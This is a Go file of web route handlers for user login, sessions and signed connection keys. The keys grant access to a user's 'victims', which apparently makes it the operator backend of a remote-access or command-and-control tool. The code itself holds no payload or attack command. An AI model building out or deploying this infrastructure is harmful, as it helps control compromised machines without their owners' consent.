package routes

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"time"

	"server.com/src/database/redis"
	"server.com/src/utils"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"golang.org/x/crypto/bcrypt"
	"server.com/src/config"
	"server.com/src/database/mongo"
	connection "server.com/src/models"
	user "server.com/src/models/User"
	victim "server.com/src/models/Victim"
)

var SERVER_CONFIG config.ServerConfig
var DEFAULT_DURATION time.Duration = time.Hour * 2

func CreateUser(g *gin.Context) {
	var NewUser user.User

	err := g.ShouldBindJSON(&NewUser)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	databaseUser, err := user.InternalUser{}.New(NewUser)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	generatedID, err := mongo.InsertDocument(databaseUser, bson.M{
		"username": NewUser.Username,
	})
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	g.JSON(200, map[string]string{"user_id": generatedID})
}

func LoginUser(g *gin.Context) {
	var loginRequest user.User
	sessionManager := sessions.Default(g)

	err := g.ShouldBindJSON(&loginRequest)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	foundUser, err := mongo.FindByQueryGeneric[user.InternalUser](bson.M{
		"username": loginRequest.Username,
	})

	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	if foundUser.IsLocked {
		g.JSON(401, utils.LockedAccountResponse)
		return
	}

	err = bcrypt.CompareHashAndPassword([]byte(foundUser.Password), []byte(loginRequest.Password))
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sessionManager.Set(utils.SESSION_KEY, foundUser.Id)
	err = sessionManager.Save()
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	g.JSON(200, gin.H{"success": utils.LOGIN_SUCCESS})
}

func GetMe(g *gin.Context) {
	manager := sessions.Default(g)

	userID := manager.Get(utils.SESSION_KEY)
	if userID == nil {
		g.JSON(400, gin.H{"error": utils.LOGIN_FIRST})
		return
	}

	foundUser, err := mongo.Find[user.InternalUser](userID.(string))
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	g.JSON(200, gin.H{
		"id":            foundUser.Id,
		"username":      foundUser.Username,
		"owned_clients": foundUser.ConnectedClients,
	})
}

func ObtainConnectionKey(g *gin.Context) {
	manager := sessions.Default(g)

	wantedVictims := new(victim.AllowedVictims)

	err := g.ShouldBindJSON(wantedVictims)

	if err != nil {
		g.JSON(400, gin.H{
			"error": err.Error(),
		})
		return
	}

	userID := manager.Get(utils.SESSION_KEY)
	if userID == nil {
		g.JSON(401, gin.H{
			"error": utils.LOGIN_FIRST,
		})
		return
	}

	victimIDQuery := bson.M{
		"_id":                   userID,
		"connected_clients._id": bson.M{"$in": wantedVictims.RequestedClients},
	}

	if len(wantedVictims.RequestedClients) == 0 {
		g.JSON(400, gin.H{
			"error": "you must provide atleast one victim id",
		})
		return
	}

	idCount, err := mongo.Col.CountDocuments(context.TODO(), victimIDQuery)
	if err != nil {
		g.JSON(400, gin.H{
			"error": err.Error(),
		})
		return
	}

	if int(idCount) != len(wantedVictims.RequestedClients) {
		g.JSON(400, gin.H{
			"error": "one or more invalid ids were encountered",
		})
		return
	}

	foundUser, err := mongo.Find[user.InternalUser](userID.(string))
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	key, err := connection.GenerateConnectionKey(userID.(string), 15, time.Hour*3)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	key.AllowedVictims = wantedVictims.RequestedClients

	calculatedHmac, err := key.CalcuateConnectionKeyHmac(
		[]byte(foundUser.Password),
		key,
	)

	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	err = redis.InsertTTL(key.ConnectionKeyID, calculatedHmac, DEFAULT_DURATION)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}
	keyBytes, err := json.Marshal(key)
	if err != nil {
		g.JSON(400, gin.H{"error": err.Error()})
		return
	}

	encodedKey := base64.RawStdEncoding.EncodeToString(keyBytes)
	g.JSON(200, connection.JsonConnectionKey{
		EncodedKey: encodedKey,
	})
}

func Logout(c *gin.Context) {
	manager := sessions.Default(c)

	if manager.Get(utils.SESSION_KEY) == "" {
		c.AbortWithStatusJSON(401, gin.H{
			"error": utils.LOGIN_FIRST,
		})
		return
	}
	manager.Clear()

	c.JSON(200, gin.H{
		"success": utils.LOGOUT_SUCCESS,
	})
}

func RevokeConnectionKey(g *gin.Context) {
	var ConnectionKey string = g.GetHeader(utils.CONNECTION_KEY_HEADER)

	if ConnectionKey == "" {
		g.JSON(400, gin.H{
			"error": utils.INVALID_CONNECTION_KEY_MESSAGE,
		})
		return
	}

	JsonConnectionKey, _, err := utils.DecodeConnectionKey(ConnectionKey)
	if err != nil {
		g.JSON(400, gin.H{
			"error": utils.INVALID_CONNECTION_KEY_MESSAGE,
		})
		return
	}

	err = redis.Database.Del(context.TODO(), JsonConnectionKey.ConnectionKeyID).Err()
	if err != nil {
		g.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	g.JSON(200, gin.H{
		"success": "key was sucessfully revoked",
	})
}
